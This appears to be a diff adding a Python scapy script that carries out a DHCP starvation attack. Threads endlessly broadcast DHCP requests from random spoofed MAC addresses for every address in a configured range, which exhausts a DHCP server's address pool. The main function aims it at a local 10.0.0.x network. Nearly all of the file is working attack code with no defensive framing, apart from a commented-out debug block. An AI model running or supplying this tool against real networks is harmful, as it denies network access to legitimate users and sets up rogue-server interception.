@@ -1,0 +1,92 @@
+from scapy.all import *
+import threading
+import time
+import ipaddress
+
+# tested with python3
+
+def randomMac():
+    firstByte = hex(int((bin(random.getrandbits(6)) + '10')[2:].zfill(8),2))[2:]
+    def hexB():
+        return hex(int(random.getrandbits(8)))[2:]
+    return firstByte + ":" + hexB() + ":" + hexB() + ":" + hexB() + ":" + hexB() + ":" + hexB()
+
+
+def getIPCount(ip_addr_start, ip_addr_end):
+    ip_range = ipaddress.summarize_address_range(ipaddress.IPv4Address(ip_addr_start), ipaddress.IPv4Address(ip_addr_end))
+    ip_count = 0
+    for subnet in ip_range:
+        ip_count += subnet.num_addresses
+    return ip_count
+
+
+def getIPList(ip_addr_start, ip_addr_end):
+    return [str(ip) for subnet in 
+                ipaddress.summarize_address_range(ipaddress.IPv4Address(ip_addr_start), ipaddress.IPv4Address(ip_addr_end)) 
+                for ip in subnet]
+
+
+class DHCPStarve:
+    def __init__(self, iface, server_ip, ip_start, ip_end, timeout=2, ips_per_thread=5, max_concurrent_threads=5):
+        self.iface = iface
+        self.timeout = timeout
+        self.server_ip = server_ip
+        self.ip_start = ip_start
+        self.ip_end = ip_end
+        self.num_of_ips = getIPCount(ip_start, ip_end)
+        self.num_threads = math.ceil(self.num_of_ips / ips_per_thread)
+        self.ips_per_thread = ips_per_thread
+        self.ip_list = getIPList(ip_start, ip_end)
+        self.sem = threading.Semaphore(max_concurrent_threads)
+
+    def starve(self):
+        for w in range(self.num_threads):
+            worker = self.worker(self,
+                                 self.ip_list[ (w * self.ips_per_thread) : ((w + 1)* self.ips_per_thread) ],
+                                 self.sem)
+            worker.start()
+        
+    class worker(threading.Thread):
+        def __init__(self, dhcp_instance, ip_list, sem):
+            threading.Thread.__init__(self)
+            self.ip_list = ip_list
+            self.sem = sem
+            self.dhcp_instance = dhcp_instance
+
+        def run(self):
+            while True:
+                with self.sem:
+                    for ip_addr in self.ip_list:
+                        self.dhcp_instance.request(ip_addr)
+                time.sleep(2) 
+    
+    def request(self, request_addr):
+        evilMac = randomMac()
+        transID = random.randint(0, 0xFFFFFFFF)
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=evilMac) / IP(dst="255.255.255.255", src="0.0.0.0") \
+            / UDP(dport=67, sport=68) / BOOTP(op=1, xid=transID, chaddr=evilMac) \
+            / DHCP(options=[("message-type", "request"), 
+                            ("requested_addr", request_addr), 
+                            ("server_id", self.server_ip), 
+                            "end"])
+        sendp(pkt, iface=self.iface, filter='src port 67', verbose=0) 
+        #### NOT WORKING, for debug    ####
+        '''
+        # only view response packets from dhcp server (src port 67)
+        ans, unans = srp(pkt, iface=self.iface, timeout=self.timeout, filter='src port 67', verbose=0, multi=1) 
+        if len(ans) != 0:
+            res = ans[0]
+        elif len(unans) != 0:
+            res = unans[0]
+        else:
+            print("no response")
+        print(res.show())
+        '''
+        ####                            ####
+
+def main(): 
+    starver = DHCPStarve('eth0', server_ip="10.0.0.1", ip_start='10.0.0.2', ip_end='10.0.0.20')
+    starver.starve()
+
+if __name__ == "__main__":
+    main()
